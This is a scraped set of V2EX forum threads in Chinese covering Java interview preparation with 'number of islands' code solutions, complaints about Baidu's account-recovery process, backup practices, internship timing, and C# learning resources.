了，复杂度虽然下不来，终归还是 AC 了</p>\n<hr>\n<p>以上是问题背景</p>\n<p>问题：</p>\n<p>作为一个转行狗，没有经验，求职 Java 实习生， 只剩下一个月的时间，</p>\n<p>方案一：用功复习下 《Think in Java》 《Spring in Action《 java 多线程》\n等等这些经典应用书籍，顺带写个小 case 出来</p>\n<p>方案二：继续刷 OJ 把精力放在面试算法题上？</p>\n<h2>站在老司机的视角，各位提点建议？</h2>\n<p>顺带有春招新手  方便留个邮箱 我会投递简历 jonwinters1992@gmail.com</p>\n</div></div>"], "reply": "26", "tittle": "转行狗， 很快要春招了， 1 个月的时间 准备的侧重点？", "comment": ["还是要结合要找的工种来决定努力方向\r", "要是 web 方向，可能算法面的不多，主要还是关心你 Java 基础怎么样，实践能力怎么样，多久能上手出活\r", "\r", "一家之言，仅供参考", "mark 下…", "看你面试公司的级别了， bat 之类的准备算法吧。其他不入流 IT 公司就做一两个项目。使用框架的那种", "同等春招，找实习中\r", "看到题拔不出来了，你说用队列和 hash 我不太懂\r", "\r", "我想到的是着色\r", "从左上开始遍历，找到 1 的话检查左侧和上侧，如果有已着色的，就把当前涂上同样颜色，如果没有，就分配新颜色\r", "然后考虑 corner case 就是如果是十字形的会存在问题。 dirty patch ：如果左侧上侧都有色而且颜色不同，对左侧元素重新着色，检查左边的延伸。", "刚刚突然想到，这不就是个图么？求连通性而已，有更简单的\r", "数 1 的个数\r", "遍历每一个元素，如果和其他 1 贴，就减 1\r", "复杂度和上面的差不多，一回事", "九章还有个强化班 楼主也可以试试~~", "这道题是刘汝佳算法里的题目，求油田的联通性。 dfs 。", "r#4 @", " #7 \r", " #4 \r", "\r", "```\r", "public class Solution {\r", "\r", "\r", "    int total;\r", "    int mapX, mapY;\r", "\r", "    class Node {\r", "\r", "        public int x, y;\r", "\r", "        public Node(int x, int y) {\r", "            this.x = x;\r", "            this.y = y;\r", "        }\r", "\r", "        @", "\r", "        public int hashCode() {\r", "            return (x + y) / 20;\r", "        }\r", "\r", "        @", "\r", "        public boolean equals(Object obj) {\r", "            Node objNode = (Node) obj;\r", "            if (objNode.x == this.x && objNode.y == this.y) {\r", "                return true;\r", "            }\r", "            return false;\r", "        }\r", "    }\r", "\r", "    Set<Node> nodeSet = new HashSet<Node>();\r", "\r", "    public int numIslands(boolean[][] grid) {\r", "        if (grid.length == 0){\r", "            return 0;\r", "        }\r", "        mapY = grid.length;\r", "        mapX = grid[0].length;\r", "        // Write your code here\r", "        for (int y = 0; y < grid.length; y++) {\r", "            for (int x = 0; x < grid[0].length; x++) {\r", "                if (grid[y][x] == false) {\r", "                    continue;\r", "                }\r", "\r", "                Node temp = new Node(x, y);\r", "                if (grid[y][x] == true && !nodeSet.contains(temp)) {\r", "                    nodeSet.add(temp);\r", "                    buildIsland(temp, grid);\r", "                    //todo\r", "                    total++;\r", "                }\r", "            }\r", "        }\r", "        return total;\r", "    }\r", "\r", "    private void buildIsland(Node node, boolean[][] grid) {\r", "        Node curNode;\r", "        Stack<Node> stack = new Stack<Node>();\r", "        stack.push(node);\r", "        while (!stack.isEmpty()) {\r", "            Node temp = stack.pop();\r", "            int x = temp.x;\r", "            int y = temp.y;\r", "\r", "            if (isLegalNode(x - 1, y) && grid[y][x-1]) {\r", "                curNode = new Node(x - 1, y);\r", "                if (nodeSet.add(curNode)) {//第一次出现\r", "                    stack.push(curNode);\r", "                }\r", "            }\r", "            if (isLegalNode(x + 1, y) && grid[y][x+1]) {\r", "                curNode = new Node(x + 1, y);\r", "                if (nodeSet.add(curNode)) {\r", "                    stack.push(curNode);\r", "                }\r", "            }\r", "            if (isLegalNode(x, y - 1) && grid[y-1][x]) {\r", "                curNode = new Node(x, y - 1);\r", "                if (nodeSet.add(curNode)) {\r", "                    stack.push(curNode);\r", "                }\r", "            }\r", "            if (isLegalNode(x, y + 1) && grid[y+1][x]) {\r", "                curNode = new Node(x, y + 1);\r", "                if (nodeSet.add(curNode)) {\r", "                    stack.push(curNode);\r", "                }\r", "            }\r", "        }\r", "\r", "    }\r", "\r", "    private boolean isLegalNode(int x, int y) {\r", "        if (x >= 0 && x < mapX && y >= 0 && y < mapY) {\r", "            return true;\r", "        }\r", "        return false;\r", "    }\r", "    \r", "}\r", "```", "r#6 @", " #6 找工作 重要啊，都吃不起饭了，再搞强化班的话", "人人都转程序员。", " 这题我认为简单遍历就行", "现在 Java 流行什么框架？", " 我是 Python 党啊（大雾）。你用 Hash 的目的是为了每个 i,j 的位置生成一个唯一的 ID?我贴一下我之前学的时候写的解法，没有检验参数，但基本就是这样啦。也改成 Java 版了：\r", "\r", "```\r", "public class NumberOfIslands {\r", "    int count = 2;\r", "\r", "    public int solve(int[][] island) {\r", "\r", "        for (int i = 0; i < island.length; i++)\r", "            for (int j = 0; j < island[0].length; j++) {\r", "                if (island[i][j] == 1) {\r", "                    dfs(island, i, j);\r", "                    count += 1;\r", "                }\r", "            }\r", "        for (int i = 0; i < island.length; i++) {\r", "            for (int j = 0; j < island[0].length; j++) {\r", "                System.out.print(island[i][j] + \" \");\r", "            }\r", "            System.out.println();\r", "        }\r", "        return count-2;\r", "    }\r", "\r", "    public void dfs(int[][] island, int i, int j) {\r", "        if (i < 0 || i >= island.length || j < 0 || j >= island[0].length || island[i][j] == 0)\r", "            return;\r", "        if (island[i][j] == 1) {\r", "            island[i][j] = count;\r", "            dfs(island, i + 1, j);\r", "            dfs(island, i - 1, j);\r", "            dfs(island, i, j - 1);\r", "            dfs(island, i, j + 1);\r", "        }\r", "    }\r", "\r", "    public static void main(String[] args) {\r", "        int[][] island = {\r", "                {1, 1, 0, 0, 0},\r", "                {0, 1, 0, 0, 1},\r", "                {0, 0, 0, 1, 1},\r", "                {0, 0, 0, 0, 0},\r", "                {0, 0, 0, 0, 1},\r", "        };\r", "        NumberOfIslands s = new NumberOfIslands();\r", "        System.out.println(s.solve(island));\r", "    }\r", "}\r", "\r", "```", "对了，我最近在写这个： ", " ：-D  把之前零散的东西聚起来～～", "复习一下概率论。面试官喜欢问这个。", "免费劳动力大神 你怎么也开始慌了。。。。", "iOS", "岛屿那个不就是寻找岛屿的头部么？", "r#16 @", " #16 我可不是什么大神 ，兄台", "完全取决于你要面什么类型的公司，大体上，从最好的公司排起\r", "纯算法加智力题或者概率题的公司\r", "算法加上基础的公司／算法同时偏重语言细节的公司，会加若干项目经历如果面试官有兴趣的话，也可能只字不提\r", "只问项目和 API 背诵的公司，或者只问面试官知道的不多的莫名其妙的技术细节的公司\r", "\r", "看你想去和能去哪一种了", "还以为 lz 转行写 Go 了……", " 这是在讲一个笑话吗？", " 想问一下，概率题会面什么样的？举个例子？话说面 Java ，为什么面概率题啊？？(同楼主找个 Java 实习呀....)", " 说是概率其实主要考智商反应而已，也不一定是概率题，类似的都有可能，只不过以概率形式出现的我感觉最多而已，本质上利用的概率知识都是很简单的，高中生应该也差不多够了，关键是看思路。\r", "\r", "给你看个题，朋友面到过，似乎是 BAT ，显然不需要什么前置知识， ", "\r", "\r", "至于为什么问智力题，部分公司才会这么做，有些公司根本不会问你 java 的问题啊，只问纯算法，大概是觉得根本的东西万变不离其宗，语言这种表象基础好的聪明人很快也就会了，没有必要问吧。\r", "不同的公司面试差别比较大，找好目标公司再去了解他们的面试类型吧。", "大家都在考虑着转行做程序员，很多都是为了工资，但真的适合自己吗？有时候，是不是得好好考虑考虑。", "r#25 @", " #25 找到合适的工作，跟找到合适的对象  有什么区别？几乎没有任何标准答案，一千个人就有一千个选择，大多时候都是权衡利弊而已，我自认为 写代码的思维能力还是够用的，而且学了很久，谈不上多么喜欢，"]},
{"content": ["<div class=\"topic_content\">有感于 gitlab 事故，大家分享下现在在用的分享方案吧。</div>"], "reply": "3", "tittle": "最近数据丢失事故发生的有点多啊，有什么数据备份的的最佳实践吗？", "comment": ["选择靠谱的第三方\r", "- 文件分享走 Dropbox 或 Google Drive （收费那种）\r", "- 团队协作用 JIRA 或 Github 等大厂产品；自己技术过硬可以自己搭相关平台。", "syncthing 实时跨主机、跨网络文件同步", "我用坚果云和家用 nas"]},
{"content": ["<div class=\"topic_content\">手机号作废，换手机。\r<br>因为已作废，所以无法收验证码。\r<br>然后提示要申诉，进入申诉页，一个大大的二维码，不装全家桶不行……\r<br>\r<br>然后装了手机软件，扫描二维码，鬼知道你们的傻逼二维码扫描用的啥库，各种扫识别不上啊啊啊\r<br>\r<br>换了无数个扫码软件， MIUI 自带扫二维码，我查查，微信，手机 QQ ，均秒扫描上，你的百度客户端就是死活扫描不上。。。\r<br>\r<br>\r<br>终于折腾了半天 让家里的弟弟帮忙操作 换了好几个屏幕，从 U2412M 到 RMBP ，都扫不上，最后无语了把台式机显示器接到了家里的 50 寸电视上，一下子扫上了……\r<br>\r<br>而且，特么你要是用 APP 做了个原生的也就罢了，把一个 web 页框到了爆卡的百度客户端里，就这水平还让我用个毛手机（ PS 别说安全，并不需要手机登陆百度账号）\r<br>\r<br>然后，输入新手机，输入完毕，并不是给我发验证码，让我给你发短信……\r<br>你们熊厂穷到这地步了？连发短信 3 分 5 厘钱都不舍得了？老子手机漫游在国外好不好？一条短信一块钱有木有 有木有\r<br>\r<br>发就发吧 一块钱能咋地，发了一条，为了照顾你们的接收速度，等了好长时间点我已发送，提示没收到让我重发有木有？然后我特么又重发了一条，又给你了宽容度，还是没收到有木有！\r<br>\r<br>难道境外漫游短信延迟大？果断给单位特服号发了一条测试短信，这边提示送达的瞬间，那边数据库已经有我的上行短信了有木有！跨国短信也是秒到啊！\r<br>然后再回来再发给百度一条，等了 1 分钟，点，有了，这点破事儿已经花了四块钱和大把时间了\r<br>\r<br>然后让我输入姓名，身份证号码，输入了，点下一步时，高潮来了\r<br>\r<br>系统检测到您开通了百度钱包，请输入您的银行卡信息\r<br>\r<br>然后给出了银联标准的四元素验证，卡号身份证号银行预留手机号，到这一步对于智商正常的产品经理和码农来说，已经可以认证身份了，对于阿里之类顶天再来个人脸识别存档就完事了有木有？\r<br>\r<br>果断再填写了我本人的银行卡信息（哪来的傻逼产品经理上一步输入的身份证号就不能给我自动填充了？）身份证，卡号，银行预留手机号（与我要更改的以及联系的，以及之前验证过的完全一致）\r<br>\r<br>然后又来了下一步，跟我要绑定的邮箱和注册地（老子这账号注册了有十好几年了，还是个全球乱飞党，让我去想在哪里注册的？），我持有正确的账号和密码，用这个就能看到完整的邮箱脱裤子放屁再问我一次……\r<br>\r<br>\r<br>终于提交成功了，考虑到我连银行卡四元素都给你了，坐等解绑成功吧\r<br>\r<br>\r<br>然后过了很久很久，来了个短信，抱歉没通过！没通过！没通过！</div>", "<div class=\"topic_content\">几分钟前，通过 VOIP 服务器转接，伪装我的国内手机号，拨打了百度人工客服电话，在语音菜单反复循环了 N 次以后终于找打申诉的问题的菜单\r<br>\r<br>然后转人工\r<br>\r<br>在线客服跟我索要了我预留手机号码，以及我的百度 ID ，查询到了我有两次申诉记录未通过\r<br>\r<br>然后说帮我查询一下为什么没通过\r<br>\r<br>然后 10 秒钟后，他告诉我：\r<br>\r<br>系统就是没通过，没有任何资料填写错误，也没有任何原因\r<br>\r<br>系统就是没通过，没有任何资料填写错误，也没有任何原因\r<br>\r<br>系统就是没通过，没有任何资料填写错误，也没有任何原因\r<br>\r<br>然后安慰我，只要我电话打到他这里了，肯定能给我解决，客服男性，略有北京口音的普通话，态度良好\r<br>\r<br>然后告诉我的解决方案是，马上给我再提交给后台一次，让后台处理一下看看是否通过，只需要 1 分钟，然后跟我说，您的账户是百度的高价值账号，是重点服务的对象（哔了狗了这就是高价值和重点）\r<br>\r<br>话说完不到 1 秒钟，收到短信，您的申诉通过……</div>"], "reply": "91", "tittle": "搞不懂你们百度的脑残程序员/产品经理的逻辑。。。", "comment": ["为什么还要用百度账号？", " #1 \r", "你以为我愿意用啊\r", "公司业务有百度钱包的接口，还需要各种优惠测试\r", "而且站长工具也是必备的", "我很兴幸没绑手机\r", "\r", "看到要发短信，意味着也不能绑 G Voice 了", "国内那间不是这样？何止百度（中国）有限公司", "表示手机号换了，提示异地登录，没原手机号，有百度钱包绑着银行卡，找了几次也 TNND 没找回来。日了 Dog 了，反人类的逻辑。", "。。。同情楼主，我也是号被盗了，但因为之前参加了次百度钱包 1 分钱买网盘服务，就要不回来了\r", "\r", "提供老密码，邮箱，手机都不行", " #6 \r", "我的号没被盗，我有密码，我让家里的弟弟在常用网络登陆找回\r", "我的是实名账户，钱包绑定了自己的银行卡身份证\r", "我使用了跟钱包自己身份证对应的银行卡（四元素齐备）的手机号作为新手机号找回\r", "我有 99%自己账户的正确信息和历史信息（除了在哪个城市注册的，因为 13 年前注册，我还满中国跑，根本记不清是哪里注册的）\r", "就这样审核失败的也是没谁了", "业务逻辑不清晰，领导瞎指挥，下面的人有没有脑子不知道，但是照办的结果还是不错。给我们一个机会认识各厂，也让我意识到出淤泥而不染的企业是多么的珍贵", "第一次见到全球党还用百度的...", "百度想要搞支付，还嫩了点。", "百度帐号的用户名不能更改,简直是噩梦", "这里麻烦了一堆申请倒是通过了，您猜结果怎么着？\r", "我一登陆，发现还是那个手机号我去", "我的百度账号有天百度跟我说我的账号不安全，自动给我锁了，我没绑手机和楼主情况一样注册地点想不起来，然后人工找回失败。\r", "果断重新注册一个账号，这脑残百度没谁了。\r", "好比有天一个人在你家大门多挂把锁，跟你说你家不安全，钥匙不给你，你先去证明你是你吧。能不能证明你是你看我心情，证明不了就别回家了。", " 可怜的人...", "垃圾国家出垃圾公司，垃圾公司出垃圾人民。", "你这还算好的， 前几天登录 gmail 提示风险， 问我上次登录在哪个地区， 这也算了, 后来莫名其妙被风控了， 要我填注册地区和注册日期，我就思密达了, 我注册 gmail 还会儿还是靠生蛋邀请的, 这精确到月份的注册日期.....", "现在的用户脾气真是大，不过喷得好，已经全面放弃百度产品。", "百度，呵呵。\r", "就说说搜索引擎，他家的算法真奇妙，站点保护都没用。我自己博客的文章，永远要好几页之后，转载的，或者 feed 抓取的聚合，一直排首页第一二。。。不就是因为用了 https 么。而且人家转载也留了我链接，你居然认不出来，我才是官方。我擦。", "上次去吃个东西，然后说用百度糯米免单，在劝说下，我下了，注册，搞完提示非新客户了，可以的。我刚注册的，不是新客户。店员也是一脸懵逼，我只当我傻了，居然信了百度。", "而且爬虫也挺有意思的。\r", "比如 ", "\r", "爬出了 ", "\r", "这种奇怪的地址。。。", "百度人工申诉要填绑定过的手机号码，但是百度客户端只能输入国内手机号，国外手机号根本无法输入，导致人工验证始终无法通过。\r", "不是很懂为什么填手机号可以用国外的，找回就不行，这是故意给用国外手机号的人找茬？", "UPDATE N 个小时以后 第二次没通过！第二次没通过！第二次没通过！\r", "\r", "MLGB 的老子把你家百度钱包的实名信息全都丢过去了，这特么不是有病么。\r", "\r", "历史上有特么能申诉成功的人么？", "baidu 就是垃圾反人类，有时候登陆百度网盘还要求绑定手机号，以后再也不想用百度的任何服务！！", "告诉你个小秘密.....我当时看到那个要用手机申诉的二维码,第一反应浏览器换 UA 然后直接就过去了.....", "老哥，求 VOIP", " #25 \r", "这玩意怎么求\r", "自己国内堆个服务器搭个 asterisk 就行了啊", "哈哈，都差不多的，国内环境不好就这尿性。", "  我上个月成功了，好像没什么特别的，印象里好像只问了我注册地，你仔细想想是不是你注册的时候开了 vpn 什么的导致这里出问题了", " #28 \r", "2004 年你会开 VPN 注册么？", "迅雷更坑 海外登陆给我判账号恶意分享 封号要我发短信获得验证码 经过两次之后直接打客服电话骂了一顿到现在就没问题了😂", "其实，，，那个二维码，用随便一个解码软件得到网址，贴浏览器里打开就能申述了=。=", "被逼无奈用百度账号也没办法。这东西最好别用，百度的节操是负值。", " 还有淘宝和支付宝账号", "百度就是垃圾公司，真不明白在中国还能活这么久，前次百度来英为剑桥 李彦宏脸皮真厚。\r", "\r", "“最不要脸的是: 李彦宏提到竞争者如 360, 搜狗, 然后一句话很轻松的说: a lot of US companies are failing because of changing market. 承认事实尊重对手就这么难么? 一点风度都没有”\r", "\r", "百度 CEO 李彦宏来剑桥做演讲  ", "只有我觉得百度拿的出手的贴吧现在也不行了吗", "早已预测，百度药丸", "我觉得就是想核实更新一下数据库中你的信息", "看到这个话题我直接感觉遇到亲人了，我以前百度云帐号现在还可以登录，手机号早都注销了，然后我想把网盘的东西删除就好，找回也没啥事，结果删除还要验证码，尴尬了我只好申诉，结果申诉又要在手机扫二维码下载手机百度，结果申诉的页面的各种信息我都闷逼了，银行卡，身份证都要到底是为了什么，我就想把以前的东西删掉。百度你有毒吧！！！！！！！！！！！！！！！！！", "第二天来短信，申诉失败！", "同楼主七楼所说情况，各种信息都填了就是想解绑银行卡。银行卡信息，注册地点曾用密码都填了，就是他妈的没过！不知道怎么办", "我也是手机号无法更换，关键也是申诉失败！就像是对用户说我是你爹！不让你用！", "我找回新浪账号也是这样的，还要上传身份证照片！最后什么都弄完了还是申诉失败。", "说到这里，微博莫名其妙的让我改密码，改就改吧， 第一件事情  发短信。。   你妹的  老子不改了，\r", "爱咋地咋地", "国内的用户管理一直都很迷离.....\r", "鹅厂和熊厂都是一个样子，\r", "能不能通过验证，看运气。", "看来一批批的更新用户信息了\r", "没绑定手机号的，早晚“被风控”\r", "\r", "不知淘宝能否批量购入百度账户....", " \r", "我也是..   \r", "真的不怕百度账号被盗什么的 密码一直是 123456q  \r", "每次登陆验证 你的账号*********异常,请验证下.  \r", "然后 qq 邮箱秒到,发邮件倒是挺屌.  \r", "退出再登陆 再验证..  \r", "后来实在不想这么坑 ,改成了 baidugodie.", " #44 \r", "他鹅厂至今没遇到过这种问题\r", "尤其是他鹅厂的申诉，是高度人工决策的\r", "可以提交大量非格式证据\r", "你找一个人 让他假设你是盗号的 一一审阅你准备提交的文件吹毛求疵，只要最后没啥大问题，最后申诉都能过", "申诉只能用手机也是奇葩，因为这，我都懒得申诉了", "我怎么看了这么多楼都是申诉失败的？难道百度机器处理申诉都是 if Any then False ？究竟有没有申诉成功的？", "大厂都差不多一个样，我的网易账号没手机没密保卡改不了密码，慢慢的弃用网易家的产品了", "申诉失败的来冒个泡   已经全面放弃百度产品  不过百度怎么可能丸 现在周围的人还是习惯 “百度一下”", " 有啊，我申诉过两次，没卡壳。不过现在申诉得扫码，也许新系统判定逻辑上改傻逼了也说不定。", "和楼主一样，百度小号半年没登录，再登录就提示要申诉。申诉的流程设置很 sb 很不合理(如果你原来注册用的邮箱和手机都失效了，差不多就是逼你用它的移动端)。然而移动端和 pc 端流程也差不多，还要发短信。真 tmd sb", "百度仗着有流量自以为搞啥成啥,无论员工老板都不思进取,祸害网民,结果就成现在这样了.....", " 随便搜都是大把大把的，不过我猜现在大部分都是登录成功后要绑手机甚至银行卡的", "以前帐号不用绑定手机号的，后来我从手机百度登入到单独的百度钱包，用手机登入了。\r", "\r", "然后没绑上百度账号，跳到手机百度里去绑定，\r", "\r", "此手机已绑定百度帐号。。\r", "\r", "然后申诉，遇到楼主的问题。。\r", "\r", "最后人工（不确定是不是 AI ）回答不支持换绑。。。", " 早几年的申诉是非常容易的，提供曾使用过的密码、绑定的邮箱、注册地和常用登录地就完事了。现在多了手机和银行卡还有客户端后就麻烦了。", "我跟你有一模一样的经历，最后我放弃了百度。", " #49 \r", "if (true) throw new Excetipon(\"审核失败. 原因: 无.\");", " 同遇到这个问题，百毒的判定就是这两个属于两个账户，你需要把用手机注册的那个账号绑定一个邮箱，然后解绑手机，再把手机绑到你原来的百度账号上。", "之前还有一次在贴吧发帖，编辑了好久才发，结果不小心被我手贱误删了，结果我不能直接恢复我自己删的帖子，需要办超级会员（ 30 块钱一个月）才行， mdzz 。我办完了会员申请恢复等了两天都没动静，实在等不了就把帖子又发了一遍，结果一个多月后百度才通过申请。我有句妈卖批一定要讲！", "让我想起了 facebook 的脑残逻辑。我的邮箱注册的账号被盗了，登陆一直提示密码错误无法登陆；然后提示找回密码，我点了之后转到帮助社区；在帮助社区联系社区服务人员才能找回密码，联系他们就要登陆账号，然后又提示密码不对，无限循环……最后我搜了个帮助人员的邮箱地址，发邮件过去，对方给我个链接让我绑定真实姓名、手机号、银行卡号等等一大堆个人信息，我去他吗的，骂了他们一顿。就这种满平台黑中国的混帐东西还在天安门跑步作秀，去死吧。这种国际大厂的逻辑都这样，可想而知了", "日常骂百度，这没毛病。", "同一楼，为什么还要用百度账号？\r", "我都不知道百度账号存不存在有什么意义", "我的百度帐号被盗了，现在不用了，感觉绑定了百度钱包，但是又记不清楚了。谁知道有啥方法可以查到是否用银行卡绑定了百度钱包。", "求教如何伪装的?", "我的百度账号被盗了的时候眼镜都没眨一下的😂完全不在乎", "百度真的 SB", "看了一下手机电脑里，没有用啥百度家产品，这家厂似乎于我没啥存在感", "我的百度账号换了手机号码根本就用不了。 申诉无门，这种公司早点倒吧，我还会踩一脚。之前骂鹅厂饼厂都有员工出来说两句的 呵呵", "怕你会被盗号，人工服务", "我只想说一个，百度云，我确认我密码没错，但是他一定不让我登录，一定要我绑定手机才给登录", "要翻页的节奏？我也补一刀， baidu go die", "我觉得扫不出来是因为百度的下载链接失效了……百度网盘的 win 客户端我就下载不了。", " 我的 fb 账号也是这样…………无限循环，不知道怎么申述", "再补一个腾讯的。\r", "境外手机注册 qq 不设置密码就发号了，然后就无法登入。忘记密码会提示该手机号未注册，去注册会提示该手机号已注册。", "去年有一个账号密码忘了， 是 163 邮箱申请的， 不知道是不是那次漏洞引起的， 搞到我百度账号一直不能登录，然后就去申诉，申请了好几次都不通过，因为是备号，没绑钱包什么东西， 手机号绑的是之前在学校的，然后用不了了， 注册信息和时间，地点，用过的密码肯定都是正确的， 就是 TM 不给我通过 ，没办法 只能放弃..", "和 LZ 有相似的经历\r", "后来直接打电话到百度客服，和客服小妹纠缠了半天，一怒之下直接投诉到她经理那，后来在他经理那核对了手机号和一些基础信息后，就发了一个重置密码的邮件到邮箱\r", "百度的产品经理是为了自己的 KPI ，设计出来的东西就是要让你用它的全家桶，并且很难解绑\r", "去他妈的百度", "然而他么的还是找不回，我那个老账号都放弃了，真的是无解。", "祝百度早日关门", "让我上传身份证的时候就放弃了，后来看到百度就开黑，地图用高德，输入法用搜狗，几乎不碰百毒家任何“产品”", "盗百度号的太猖獗，人家也没办法", "感觉不能绑定 Gmail 也是很脑残\r", "[Imgur]( ", ")", "用百度，真正后悔的事再后面呢。", "虽然说起来可能一杆子打翻一船人。。。但我还是想说：百度产品经理就是垃圾", "坚持不用的百度的任何产品   真是流氓 强盗", "我只能说，骂的好", "技术无罪。。。", "阿里也差不多，上次手机丢了，挂失支付宝的时候，让我用手机号接收验证码。最后走网页客服，但是人家 9 点才上班。。。。。。。。。", "手机认证和换手机在很多网站都是冲突的 几乎是个很难解决的问题。 PS:不要怪程序员 有可能是经理脑残", "同遇到，赞同你这个百度产品经理是脑残的说法。"]},
{"content": ["<div class=\"topic_content\">准备大三下。然后好像快要春招了？感觉还有很多东西还未学。</div>"], "reply": "37", "tittle": "大三什么时候找实习", "comment": ["啥专业？ 计科？  我即将大二下", "就现在，马上总结回顾，准备简历", " 膜斌神", "去年这个时候", "开学没多久就开始招实习了，准备找实习的话现在抓紧吧", "有时间实习真幸福，大四下学期学校还安排很多课，根本没时间实习。", "建议暑假之后秋招直接找工作，毕业之前公司有实习去没有就好好玩。\r", "不要单纯找实习不着工作（除非你技术菜），更不要因为实习错过校招。", "各大厂开学就是一波实习招聘热季了，抓住机会啊", "金三银四", "同大三 已实习四个月了", "就是现在 别找借口拖。。", " 在哪里实的习？", "学校不放人啊……怎么办……关键坑爹的学校晚上还查寝……", " EE 的，但自学了 CS 的课程。", " 就是说现在大三下这段时间有实习就去？", " \r", " \r", " \r", "大神能所说该如何准备吗，就是该关注哪些网站或者说信息渠道。", "大三考试结束后找啊", " \r", "\r", "有实习可以去，但是如果实习公司不和你签三方，也就说不保证毕业正式录用你，或者你自己感觉能找到更好的公司，那样一定不要因为实习耽误别的校招。\r", "\r", "校招对学生来说可以说是难度最低的机会最多的时候，有些人跑去实习了，实习结束公司不要或者自己不留，结果发现之前错过了很多机会，再去招聘难度也提升不少，千万别走他们老路。", "太早了。你课程那么多，学校那边怎么办", " 非常感谢前辈指导！", " 学校那边基本也没有什么课程了。", " 百度", " 哇，问问是做什么职位的，申请过程是怎样的？", "同大三啊，然而我是 HR 专业……感觉特别特别水啊，实习难找啊对口的，毕竟这行看经验的多，而且学校也不咋地", " \r", "我校软件学院也是这样学两年半\r", "不过大三下是学校带着统一实习", "最好是大二和大三这两个暑假。。。。", "牛客网可以看一下，上面有不少面经，把问题总结出来，网站上还有挺多真题的，多刷刷算法题，牛客上面有 oj ，把剑指 offer 的题刷两遍，有时间再刷别的。", " #23 算法 给招聘的邮箱发简历", " 好的谢谢，我也试试。", " 多谢前辈，新年快乐！", "上学期就招完了吧", "就是现在", "实习 ... 后悔实习了 没啥卵用", "同为大三，好方", " 为什么", " 抱紧大腿", "大三下学期，实习 1 年，拿完 offer 大四下学期就可以回学校玩了。。"]},
{"content": ["<div class=\"topic_content\">我试了下是不行，有没有什么办法呢？</div>"], "reply": "1", "tittle": "OneNote Web Clipper 不能登录中国版 office 365 的帐号吗？", "comment": ["中国版的不行"]},
{"content": ["<div class=\"topic_content\">一、贴图<br><br>使用各种图片空间保存图片，比如：http://www.v2ex.com/t/44453?p=2<br><br>然后复制图片地址，注意地址后缀是图片后缀（比如.jpg）才行<br><br>发帖时直接放图片网址即可，不用任何其他代码<br><br><br>二、贴代码<br><br>这个我刚才试验了半天才搞明白<br><br>在这里保存代码 <a href=\"https://gist.github.com/\" rel=\"nofollow\">https://gist.github.com/</a> 这个大家一看就会用<br><br>生成链接后复制左上第一个链接<br><br>格式是这个样子的 <a href=\"https://gist.github.com/5894938.git\" rel=\"nofollow\">https://gist.github.com/5894938.git</a><br><br>这时候要把 https 修改为 http，并去掉最后的 .git<br><br>然后在发帖时直接粘贴修改后的链接即可。<br><br><br><br><br>分享一下，给像我一样的新手</div>", "<div class=\"topic_content\">现在贴代码要用<br><br>https://……<br><br>才行<br><br>就是只需要去掉.git即可</div>", "<div class=\"topic_content\">请移步至最新版： <a target=\"_blank\" href=\"https://www.v2ex.com/t/130567\" rel=\"nofollow\">https://www.v2ex.com/t/130567</a></div>"], "reply": "253", "tittle": "[V2EX技巧] 贴图和贴代码的方法（写给像我一样的小白）", "comment": ["<script src=\"", ".js\"></script>", " ", "test \r", "\r", "\r", "just for test", " ", "测试一下", " 怎么贴不上呢", "test ", "test \r", "\r", "test \r", " ", "~~~\r", "a = 1\r", "~~~", "test\r", " ", " ", " ", " ", " ", "test\r", " ", "test\r", " ", " ", "( ", ")", "[]( ", ")", "test ![]( ", ")", "test "]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://github.com/roxma/nvim-completion-manager\" rel=\"nofollow\">https://github.com/roxma/nvim-completion-manager</a></div>"], "reply": "目前尚无回", "tittle": "工欲善其事必先利其器~趁春节给自己写了个 neovim 代码补全插件~", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前负责管理的一个网页项目，似乎总是有不同网段的机器访问速度不一样的问题，有些网段的甚至无法正常打开或提交。于是学着看 F12 ……\n发现速度慢的 Request Headers 普遍有这种情况\nProvisional headers are shown\n不知道是不是意味着请求没有发送出去？</p>\n<p>另外为了查这个，看了下 chrome://net-internals/#events\n然而并不知道里面说的是什么……想求教下如何掌握这个技能树需要</p>\n</div></div>"], "reply": "2", "tittle": "关于网页发出请求的一些问题", "comment": ["\r", "\r", "要不就是跨域要不就是插件问题\r", "\r", "你 burpsuite 抓包截图下", " 插件问题应该不存在吧，毕竟浏览器几乎都是干干净净的，而且是统一安装的。\r", "跨域。。。说实在的关于域这个东西一直不是很了解，我们这里也刚装了域什么的……\r", "最后，这个 burpsuite 不会用……见笑了囧……\r", "很抱歉没能及时回复"]},
{"content": ["<div class=\"topic_content\">曾经的 ASP/PHP 程序猿转的运维，最近被开发组的同事坑哭了，他们用的是 C#，貌似程序写得乱七八糟的，同时 20 个并发的时候 IIS 进程池就挂掉了，我排除掉了服务器环境的原因，基本可以确定是他们程序有问题，他们自己查不出问题原因，然后我惊奇的发现他们调试能力极其差，遇到错误的时候除了一脸懵逼就是一直各种说没可能啊奇怪啊这类的废话。对于错误根本无从入手，指望不上了他们，我打算自己去学下 C#来解决问题。网上翻了些教程，基本都是废话一大堆，求推荐个废话比较少的 C#入门教程。谢谢~</div>"], "reply": "23", "tittle": "求推荐个废话比较少的 C#入门教程", "comment": ["我记得很久之间是看微软的快速入门文档入的门。", "废话使人快乐", "c#图解教程足以，类库的用例直接 MSDN+SO", "直接读读程序吧，遇到细节需要仔细了解的其实 msdn library 就够了", "运维同学都这么 nb 啊。。。厉害！", "因为之前只会 ASP/PHP （解释型语言），现在要学 C#（编译型语言），所以还是有点无从下手的，特别是打开宇宙第一 IDE   VS 的时候，也是一脸懵逼，也许视频教程会比较好上手一点。", "大公司小公司？有这么坑的开发？", "推荐用《 C#高级编程（第 8 版）》把各个知识点都撸一遍", "坐等推荐", "随便找个课本 看四五章 然后就开始写程序 写个两三千行再回来补正规书\r", "第一本看什么高级编程 跟入门就看 TIJ 一样不靠谱", "MSDN", " 推荐这个站点", "《 C# 入门经典》\r", "《 C# 高级编程》\r", "这两本书靠谱", "简单扫一遍语法就这个 ", "中国好运维", "我当初 c#干了 3 年，大概也是这个样子。", " 你确定不是撩他玩？", "PluralSight 上 C# 课程挺多，有几门质量也比较高", "<深入理解 c#>", "让我想起了以前一设计师设计了一个界面，让客户端给实现，客户端各种嫌麻烦，说搞不定，让改设计方案，设计师原地爆炸，当场给实现了一个。", "你行你上啊系列的励志版：上就上！", " 四线城市，十人小公司，开发拥有十年 C#从业经验。", " 他这个十年经验还当不了大学毕业生"]},
